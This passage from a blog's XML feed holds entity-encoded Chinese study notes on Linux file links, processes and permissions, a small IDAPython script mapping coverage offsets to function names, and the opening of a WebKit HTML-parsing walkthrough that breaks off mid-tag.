#&#x4E3A;1.txt&#x521B;&#x5EFA;&#x94FE;&#x63A5;2.txt)<br>&#x786C;&#x94FE;&#x63A5;&#x4E3A;&#x4E86;&#x652F;&#x6301;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x94FE;&#x63A5;&#x5230;&#x4E00;&#x4E2A;inode&#xFF0C;&#x5373;&#x4E24;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x6307;&#x5411;&#x540C;&#x4E00;&#x4E2A;&#x78C1;&#x76D8;&#x6570;&#x636E;&#xFF1B;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x5F53;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x4E4B;&#x540E;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x4E5F;&#x662F;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x6570;&#x636E;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x80FD;&#x591F;&#x6267;&#x884C;&#x5220;&#x9664;inode&#xFF1B;&#x6240;&#x4EE5;inode&#x6DFB;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF0C;&#x94FE;&#x63A5;&#x8BA1;&#x6570;&#xFF0C;&#x8868;&#x793A;&#x94FE;&#x63A5;&#x5230;&#x8BE5;inode&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6570;&#x91CF;&#xFF0C;&#x5F53;&#x4E3A;0&#x65F6;&#x5C31;&#x53EF;&#x4EE5;&#x5220;&#x9664;&#x4E86;&#x3002;&#x7C7B;&#x4F3C;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x5E38;&#x89C1;&#x7684;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x3002;</p><h4 id="&#x8F6F;&#x94FE;&#x63A5;-&#x7B26;&#x53F7;&#x94FE;&#x63A5;"><a href="#&#x8F6F;&#x94FE;&#x63A5;-&#x7B26;&#x53F7;&#x94FE;&#x63A5;" class="headerlink" title="&#x8F6F;&#x94FE;&#x63A5;(&#x7B26;&#x53F7;&#x94FE;&#x63A5;)"></a>&#x8F6F;&#x94FE;&#x63A5;(&#x7B26;&#x53F7;&#x94FE;&#x63A5;)</h4><p>&#x7C7B;&#x4F3C;&#x4E8E;&#x5E38;&#x8BF4;&#x7684;&#x5FEB;&#x6377;&#x65B9;&#x5F0F;&#xFF0C;&#x5B83;&#x5E76;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x94FE;&#x63A5;&#x5230;&#x5B9E;&#x9645;&#x7684;inode&#x6570;&#x636E;&#xFF1B;&#x800C;&#x662F;&#x5305;&#x542B;&#x53E6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#x4FE1;&#x606F;&#x3002;&#x6240;&#x4EE5;&#x70B9;&#x51FB;&#x7B26;&#x53F7;&#x94FE;&#x63A5;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x627E;&#x5230;&#x539F;&#x59CB;&#x6587;&#x4EF6;&#x540D;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x901A;&#x8FC7;&#x8BE5;&#x4F4D;&#x7F6E;&#x627E;&#x5230;inode&#x3002;(ln -s 1.txt symbolicLink)<br>&#x503C;&#x5F97;&#x4E00;&#x63D0;&#x7684;&#x662F;&#xFF0C;&#x5C31;&#x7B97;&#x6CA1;&#x6709;1.txt&#xFF0C;&#x4E5F;&#x662F;&#x80FD;&#x591F;&#x521B;&#x5EFA;symbolicLink&#x7684;&#xFF0C;&#x53EA;&#x662F;&#x5728;&#x8BBF;&#x95EE;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x627E;&#x4E0D;&#x5230;&#x4F4D;&#x7F6E;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x800C;&#x5DF2;&#x3002;<br>&#x786C;&#x94FE;&#x63A5;&#x3001;&#x8F6F;&#x94FE;&#x63A5;&#x8BE6;&#x7EC6;&#x53EF;&#x53C2;&#x8003;: <a href="http://blog.csdn.net/u013777351/article/details/50557260" target="_blank" rel="noopener">http://blog.csdn.net/u013777351/article/details/50557260</a></p><h4 id="&#x7279;&#x6B8A;&#x6587;&#x4EF6;"><a href="#&#x7279;&#x6B8A;&#x6587;&#x4EF6;" class="headerlink" title="&#x7279;&#x6B8A;&#x6587;&#x4EF6;"></a>&#x7279;&#x6B8A;&#x6587;&#x4EF6;</h4><p>&#x5757;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x3001;&#x5B57;&#x7B26;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x3001;&#x547D;&#x4EE4;&#x7BA1;&#x9053;&#x3001;Unix&#x57DF;&#x5957;&#x63A5;&#x5B57;</p><h4 id="&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0E;&#x547D;&#x4EE4;&#x7A7A;&#x95F4;"><a href="#&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0E;&#x547D;&#x4EE4;&#x7A7A;&#x95F4;" class="headerlink" title="&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0E;&#x547D;&#x4EE4;&#x7A7A;&#x95F4;"></a>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0E;&#x547D;&#x4EE4;&#x7A7A;&#x95F4;</h4><p>&#x8BE6;&#x89C1;&#xFF1A;<a href="https://www.ibm.com/developerworks/cn/linux/l-linux-filesystem/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/l-linux-filesystem/index.html</a></p><h3 id="&#x8FDB;&#x7A0B;&#x548C;&#x7EBF;&#x7A0B;"><a href="#&#x8FDB;&#x7A0B;&#x548C;&#x7EBF;&#x7A0B;" class="headerlink" title="&#x8FDB;&#x7A0B;&#x548C;&#x7EBF;&#x7A0B;"></a>&#x8FDB;&#x7A0B;&#x548C;&#x7EBF;&#x7A0B;</h3><p>&#x8FDB;&#x7A0B;&#x7684;&#x7BA1;&#x7406;&#xFF1A;Linux&#x4E2D;&#x8FDB;&#x7A0B;&#x6709;&#x4E00;&#x4E2A;&#x4E25;&#x683C;&#x7684;&#x5C42;&#x6B21;&#x7ED3;&#x6784;&#xFF0C;&#x8FDB;&#x7A0B;&#x6811;&#xFF1B;&#x8FDB;&#x7A0B;&#x6811;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;init&#x8FDB;&#x7A0B;&#x4E3A;&#x6839;&#xFF0C;&#x65B0;&#x8FDB;&#x7A0B;&#x901A;&#x8FC7;fork&#x521B;&#x5EFA;&#xFF0C;&#x65B0;&#x8FDB;&#x7A0B;&#x4E3A;&#x8C03;&#x7528;fork&#x7684;&#x8FDB;&#x7A0B;&#x7684;&#x5B50;&#x8FDB;&#x7A0B;&#x3002;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x7236;&#x8FDB;&#x7A0B;&#x5728;&#x5B50;&#x8FDB;&#x7A0B;&#x524D;&#x7EC8;&#x6B62;&#xFF0C;&#x90A3;&#x4E48;&#x5185;&#x6838;&#x5C06;&#x6307;&#x5B9A;init&#x8FDB;&#x7A0B;&#x4E3A;&#x5176;&#x7236;&#x8FDB;&#x7A0B;&#xFF1B;&#x5C31;&#x662F;&#x8BF4;&#x5F53;&#x7236;&#x8FDB;&#x7A0B;&#x7ED3;&#x675F;&#x540E;&#xFF0C;&#x5B50;&#x8FDB;&#x7A0B;&#x4E5F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x6267;&#x884C;&#x3002;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7EC8;&#x6B62;&#x540E;&#xFF0C;&#x4E0D;&#x4F1A;&#x7ACB;&#x5373;&#x4ECE;&#x7CFB;&#x7EDF;&#x4E2D;&#x79FB;&#x9664;&#xFF0C;&#x5185;&#x6838;&#x5C06;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x4FDD;&#x5B58;&#x8FDB;&#x7A0B;&#x7684;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#xFF0C;&#x5141;&#x8BB8;&#x7236;&#x8FDB;&#x7A0B;&#x67E5;&#x8BE2;&#x8BE5;&#x8FDB;&#x7A0B;&#x662F;&#x5426;&#x5904;&#x4E8E;&#x7EC8;&#x6B62;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x786E;&#x5B9A;&#x7EC8;&#x6B62;&#x540E;&#x624D;&#x4F1A;&#x5B8C;&#x5168;&#x5220;&#x9664;&#x3002;<br>&#x50F5;&#x5C38;&#x8FDB;&#x7A0B;&#xFF1A;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5904;&#x4E8E;&#x7EC8;&#x6B62;&#x72B6;&#x6001;&#xFF0C;&#x4F46;&#x5176;&#x7236;&#x8FDB;&#x7A0B;&#x5C1A;&#x672A;&#x83B7;&#x77E5;&#x5B83;&#x7684;&#x72B6;&#x6001;&#x3002;</p><h3 id="&#x7528;&#x6237;&#x3001;&#x7EC4;&#x548C;&#x6743;&#x9650;"><a href="#&#x7528;&#x6237;&#x3001;&#x7EC4;&#x548C;&#x6743;&#x9650;" class="headerlink" title="&#x7528;&#x6237;&#x3001;&#x7EC4;&#x548C;&#x6743;&#x9650;"></a>&#x7528;&#x6237;&#x3001;&#x7EC4;&#x548C;&#x6743;&#x9650;</h3><p>&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x7528;&#x4E8E;&#x6743;&#x9650;&#x7684;&#x7BA1;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x5E73;&#x65F6;&#x4F7F;&#x7528;Linux&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x5728;&#x5B83;&#x7684;&#x5C5E;&#x6027;&#x4E2D;&#x80FD;&#x591F;&#x770B;&#x5230;&#x5176;&#x6240;&#x5C5E;&#x4E8E;&#x7684;&#x7528;&#x6237;&#x4EE5;&#x53CA;&#x7528;&#x6237;&#x7EC4;&#xFF0C;&#x4EE5;&#x4FBF;&#x7ED9;&#x4E88;&#x76F8;&#x5E94;&#x7684;&#x6743;&#x9650;&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">varas@varas-virtual-machine:~$ ls -l ./a.txt </span><br><span class="line">-rw-rw-r-- 1 varas varas 0 9&#x6708;  20 11:37 ./a.txt</span><br></pre></td></tr></tbody></table></figure><br>&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x8BE5;&#x6587;&#x4EF6;&#x6240;&#x5C5E;&#x4E8E;&#x7684;&#x7528;&#x6237;&#x548C;&#x7528;&#x6237;&#x7EC4;&#x90FD;&#x662F;varas&#xFF0C;&#x5BF9;&#x5E94;&#x4E8E;&#x5DE6;&#x8FB9;&#x7684;&#x4E09;&#x7EC4;&#x6743;&#x9650;&#xFF0C;&#x5206;&#x914D;&#x662F;&#x7528;&#x6237;&#x3001;&#x7528;&#x6237;&#x7EC4;&#x3001;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x3002;<br>&#x8FDB;&#x7A0B;&#x4E5F;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x7BA1;&#x7406;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4E0E;&#x4E00;&#x4E2A;&#x7528;&#x6237;ID&#x5173;&#x8054;&#xFF0C;&#x7528;&#x4E8E;&#x8BC6;&#x522B;&#x8FD0;&#x884C;&#x8FD9;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x7528;&#x6237;<p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idapython</title>
      <link href="/2017/09/15/idapython/"/>
      <url>/2017/09/15/idapython/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="idapython&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x4F8B;&#x5B50;"><a href="#idapython&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x4F8B;&#x5B50;" class="headerlink" title="idapython&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x4F8B;&#x5B50;"></a>idapython&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x4F8B;&#x5B50;</h2><h3 id="&#x83B7;&#x53D6;&#x504F;&#x79FB;&#x5730;&#x5740;&#x6240;&#x5728;&#x7684;&#x51FD;&#x6570;"><a href="#&#x83B7;&#x53D6;&#x504F;&#x79FB;&#x5730;&#x5740;&#x6240;&#x5728;&#x7684;&#x51FD;&#x6570;" class="headerlink" title="&#x83B7;&#x53D6;&#x504F;&#x79FB;&#x5730;&#x5740;&#x6240;&#x5728;&#x7684;&#x51FD;&#x6570;"></a>&#x83B7;&#x53D6;&#x504F;&#x79FB;&#x5730;&#x5740;&#x6240;&#x5728;&#x7684;&#x51FD;&#x6570;</h3><p>&#x4F7F;&#x7528;pin&#x505A;&#x57FA;&#x672C;&#x5757;&#x7684;&#x8986;&#x76D6;&#x7387;&#x7EDF;&#x8BA1;&#xFF0C;&#x5F97;&#x5230;&#x7684;&#x57FA;&#x672C;&#x5757;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x201D;dll+&#x504F;&#x79FB;&#x201D; &#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x5F53;&#x9700;&#x8981;&#x5F15;&#x5165;&#x7B26;&#x53F7;&#x6587;&#x4EF6;&#x77E5;&#x9053;&#x57FA;&#x672C;&#x5757;&#x5728;&#x54EA;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x7528;&#x5230;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x501F;&#x7528; GetFuncOffset &#x63A5;&#x53E3;<br></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#coding=utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> idaapi <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span></span><br><span class="line"><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;base_address: %s&quot;</span> % hex(get_imagebase())</span><br><span class="line">base_address = get_imagebase()</span><br><span class="line"></span><br><span class="line">f = open(file_path, <span class="hljs-string">&quot;r&quot;</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:</span><br><span class="line">line = line.replace(<span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="line">offset_addr = int(<span class="hljs-string">&quot;0x&quot;</span> + line.split(<span class="hljs-string">&quot;+&quot;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)</span><br><span class="line">addr = offset_addr + base_address</span><br><span class="line"><span class="hljs-keyword">print</span> GetFuncOffset(addr)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></tbody></table></figure><p></p></body></html>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WebKit执行结合对应的源代码</title>
      <link href="/2017/09/13/WebKit-code/"/>
      <url>/2017/09/13/WebKit-code/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="WebKit"><a href="#WebKit" class="headerlink" title="WebKit"></a>WebKit</h2><p>WebKit &#x4F5C;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#xFF0C;&#x7ED3;&#x6784;&#x5F88;&#x590D;&#x6742;&#xFF0C;&#x672C;&#x6B21;&#x4E3B;&#x8981;&#x9488;&#x5BF9;&#x4E8E;&#x5176;&#x51E0;&#x4E2A;&#x6838;&#x5FC3;&#x7ED3;&#x6784;&#x8FDB;&#x884C;&#x5206;&#x6790;&#xFF0C;&#x6574;&#x4F53;&#x7ED3;&#x6784;&#x4E0D;&#x6D89;&#x53CA;&#x5230;&#x5F88;&#x7EC6;&#x8282;&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#x3002;&#x5206;&#x6790;&#x6D41;&#x7A0B;&#x5305;&#x62EC;&#x4E09;&#x6B65;&#xFF1A;1. &#x6574;&#x4F53;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#xFF0C;2. &#x5BF9;&#x5E94;&#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x6838;&#x5FC3;&#x5904;&#x7406;&#x7C7B;&#xFF0C;3. &#x76F8;&#x5173;&#x90E8;&#x5206;&#x7EC6;&#x8282;&#x4ECB;&#x7ECD;</p><h2 id="HTML-&#x89E3;&#x91CA;&#x5668;"><a href="#HTML-&#x89E3;&#x91CA;&#x5668;" class="headerlink" title="HTML &#x89E3;&#x91CA;&#x5668;"></a>HTML &#x89E3;&#x91CA;&#x5668;</h2><p>HTML&#x89E3;&#x91CA;&#x5668;&#x662F;&#x5BF9;&#x7F51;&#x9875;&#x4E2D;&#x7684;HTML&#x89E3;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x6700;&#x540E;&#x5C06;&#x5904;&#x7406;&#x6210;&#x4E3A;DOM&#x6811;&#x7ED3;&#x6784;&#x3002;<br>HTML&#x89E3;&#x91CA;&#x5668;&#x7684;&#x8F93;&#x5165;&#x4E3A;&#x7F51;&#x7EDC;&#x6216;&#x8005;&#x672C;&#x5730;&#x78C1;&#x76D8;&#x4E2D;&#x83B7;&#x53D6;&#x7684;HTML&#x7F51;&#x9875;&#x548C;&#x8D44;&#x6E90;&#x5B57;&#x8282;&#x6D41;&#xFF1B;&#x8F93;&#x51FA;&#x4E3A;DOM&#x6811;&#x7ED3;&#x6784;&#xFF08;WebKit&#x6280;&#x672F;&#x5185;&#x5E55; P107&#xFF09;&#x3002;<br>&#x8FD9;&#x4E5F;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x6267;&#x884C;&#x7684;&#x6700;&#x8D77;&#x59CB;&#x7684;&#x6B65;&#x9AA4;&#xFF0C;&#x5F53;&#x5728;&#x7F51;&#x9875;&#x4E2D;&#x8F93;&#x5165;&#x4E00;&#x4E2A;URL&#x65F6;&#xFF0C;&#x76F8;&#x5173;&#x5B57;&#x8282;&#x6D41;&#x6570;&#x636E;&#x5C06;&#x4F1A;&#x4F20;&#x56DE;&#x7ED9;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;HTML&#x89E3;&#x91CA;&#x5668;&#x5C06;&#x5F00;&#x59CB;&#x5904;&#x7406;&#x3002;</p><h3 id="HTML&#x89E3;&#x91CA;&#x5668;&#x5904;&#x7406;&#x6D41;&#x7A0B;"><a href="#HTML&#x89E3;&#x91CA;&#x5668;&#x5904;&#x7406;&#x6D41;&#x7A0B;" class="headerlink" title="HTML&#x89E3;&#x91CA;&#x5668;&#x5904;&#x7406;&#x6D41;&#x7A0B;"></a>HTML&#x89E3;&#x91CA;&#x5668;&#x5904;&#x7406;&#x6D41;&#x7A0B;</h3><p>&#x5B57;&#x8282;&#x6D41;&#x5904;&#x7406;&#x6210;&#x4E3A;&#x5B57;&#x7B26;&#x6D41;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x6210;&#x5C31;&#x662F;&#x5E73;&#x65F6;&#x6211;&#x4EEC;&#x770B;&#x5230;&#x7684;&#x7F51;&#x9875;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><br>&#x7136;&#x540E;&#x5C06;&#x91CC;&#x9762;&#x7684;&#x6807;&#x7B7E;&#x3001;&#x503C;&#x7B49;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x5F62;&#x6210;&#x4E00;&#x4E2A;&#x4E2A;&#x8BCD;&#x8BED;token&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4F9D;&#x636E;token&#x521B;&#x5EFA;&#x8282;&#x70B9;&#xFF0C;&#x518D;&#x5C06;&#x5176;&#x52A0;&#x5165;&#x5230;DOM&#x6811;&#x4E2D;&#x5B8C;&#x6210;DOM&#x7684;&#x6784;&#x5EFA;&#x3002;<br>&#x5BF9;&#x5E94;&#x4E8E;WebKit&#x7684;&#x5904;&#x7406;&#xFF1A;<br>&#x4F5C;&#x4E3A;&#x6846;&#x7ED3;&#x6784;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x6574;&#x4E2A;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;MainFrame&#xFF0C;&#x6846;&#x91CC;&#x9762;&#x662F;&#x4E00;&#x4E2A;Document&#xFF0C;Document&#x91CC;&#x9762;&#x53EF;&#x4EE5;&#x5D4C;&#x5165;&#x591A;&#x4E2A;&#x5B50;&#x6846;&#xFF0C;&#x7ED3;&#x6784;&#x7C7B;&#x4F3C;&#x3002;<br><img src="/images/WebKit-code/Frame-Document.png" alt="Frame-Document"><br>&#x6240;&#x4EE5;&#x5904;&#x7406;&#x7684;&#x5165;&#x53E3;&#x51FD;&#x6570;&#x662F;Frame&#x76F8;&#x5173;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5927;&#x81F4;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;<br><img src="/images/WebKit-code/2.png" alt="Main-Class"><br>&#x9996;&#x5148;&#x662F;&#x8C03;&#x7528;FrameLoader&#xFF0C;&#x7528;&#x4E8E;&#x6846;&#x5185;&#x5BB9;&#x7684;&#x52A0;&#x8F7D;&#xFF0C;&#x7136;&#x540E;&#x5728;FrameLoader&#x4E2D;&#x5C06;&#x52A0;&#x8F7D;DocumentLoader&#x7528;&#x4E8E;Document&#x5185;&#x5BB9;&#x7684;&#x52A0;&#x8F7D;&#xFF1B;&#x6B64;&#x65F6;&#x5C06;&#x8C03;&#x7528;DocumentWriter&#x7528;&#x4E8E;&#x521B;&#x5EFA;Document&#x8282;&#x70B9;&#xFF0C;&#x5373;DOM&#x6811;&#x7684;&#x6839;&#x8282;&#x70B9;HTMLDocument&#x5BF9;&#x8C61;&#xFF1B;&#x7136;&#x540E;&#x5C06;&#x8C03;&#x7528;HTMLDocumentParser&#x89E3;&#x6790;HTML&#xFF0C;&#x5728;&#x6839;&#x8282;&#x70B9;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x5B8C;&#x5584;DOM&#x6811;&#xFF0C;&#x6700;&#x7EC8;&#x5B9E;&#x73B0;DOM&#x6811;&#x7684;&#x6784;&#x5EFA;&#x3002;<p></p><h3 id="&#x5BF9;&#x5E94;&#x6E90;&#x4EE3;&#x7801;&#x5904;&#x7406;&#x7C7B;"><a href="#&#x5BF9;&#x5E94;&#x6E90;&#x4EE3;&#x7801;&#x5904;&#x7406;&#x7C7B;" class="headerlink" title="&#x5BF9;&#x5E94;&#x6E90;&#x4EE3;&#x7801;&#x5904;&#x7406;&#x7C7B;"></a>&#x5BF9;&#x5E94;&#x6E90;&#x4EE3;&#x7801;&#x5904;&#x7406;&#x7C7B;</h3><p>&#x52A0;&#x8F7D;&#x8FC7;&#x7A0B;&#x4E2D;&#x8C03;&#x7528;DocumentWriter&#x6765;&#x521B;&#x5EFA;Document&#x6839;&#x8282;&#x70B9;:<br><img src="/images/WebKit-code/3.PNG" alt="Create-Document"><br>&#x7136;&#x540E;&#x5C06;&#x5F97;&#x5230;&#x4E00;&#x4E2A;DocumentParser&#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x4E8E;&#x540E;&#x9762;&#x7684;HTML&#x89E3;&#x6790;<br><img src="/images/WebKit-code/4.PNG" alt="m_parser"></p><p>&#x5728;HTMLDocumentParser&#x4E2D;&#x89E3;&#x6790;HTML&#x4EE3;&#x7801;&#x521B;&#x5EFA;DOM&#x6811;&#xFF0C;&#x4E3B;&#x8981;&#x6D41;&#x7A0B;&#x5728;HTMLDocumentParser::pumpTokenizerLoop&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x5FAA;&#x73AF;&#x5904;&#x7406;Token&#xFF0C;&#x5177;&#x4F53;&#x5728;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;<br><img src="/images/WebKit-code/5.PNG" alt="HTMLDocumentParser"><br>&#x4E3B;&#x8981;&#x5305;&#x542B;&#x4E09;&#x6B65;&#xFF1A;</p><ol><li>&#x4ECE;HTML&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x63D0;&#x53D6;&#x51FA;token</li><li>&#x5BF9;&#x63D0;&#x53D6;&#x7684;token&#x4F7F;&#x7528;XSSAuditor&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;</li><li>&#x4F9D;&#x636E;token&#x8FDB;&#x884C;DOM&#x6811;&#x7684;&#x6784;&#x5EFA;<br>&#x63D0;&#x53D6;token&#x4E3B;&#x8981;&#x7531;HTMLTokenizer&#x7C7B;&#x6765;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF1B;XSSAuditor&#x8FC7;&#x6EE4;&#x7528;XSSAuditor&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x8C03;&#x7528;filterToken&#x51FD;&#x6570;&#xFF1B;&#x4F9D;&#x636E;token&#x8FDB;&#x884C;DOM&#x6811;&#x6784;&#x5EFA;&#x4E3B;&#x8981;&#x6709;HTMLTreeBuilder&#x7C7B;&#x6765;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x8C03;&#x7528;constructTree&#x51FD;&#x6570;&#x3002;<br>&#x4E0B;&#x9762;&#x91CD;&#x70B9;&#x770B;&#x4E00;&#x4E0B;&#x7531;token&#x5230;DOM&#x8282;&#x70B9;&#x7684;&#x63D2;&#x5165;&#x8FC7;&#x7A0B;&#x3002;</li></ol><h3 id="DOM&#x6811;&#x7684;&#x6784;&#x5EFA;"><a href="#DOM&#x6811;&#x7684;&#x6784;&#x5EFA;" class="headerlink" title="DOM&#x6811;&#x7684;&#x6784;&#x5EFA;"></a>DOM&#x6811;&#x7684;&#x6784;&#x5EFA;</h3><p>&#x63A5;&#x7740;&#x4E0A;&#x9762;&#x7684;&#x63CF;&#x8FF0;&#xFF0C;&#x5F53;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;token&#x65F6;&#xFF0C;&#x5C06;&#x4F7F;&#x7528;&#x5176;&#x8FDB;&#x884C;DOM&#x6784;&#x5EFA;&#xFF0C;&#x5373;&#x52A0;&#x5165;&#x5230;DOM&#x6811;&#x4E2D;&#xFF0C;&#x5165;&#x53E3;&#x51FD;&#x6570;&#x4E3A;HTMLTreeBuilder::constructTree&#xFF0C;&#x8F93;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A;token&#x3002;<br><img src="/images/WebKit-code/6.PNG" alt="ConstructTree"><br>&#x9996;&#x5148;&#x662F;processToken&#xFF0C;&#x7528;&#x4E8E;&#x5BF9;token&#x7684;&#x5904;&#x7406;<br><img src="/images/WebKit-code/7.PNG" 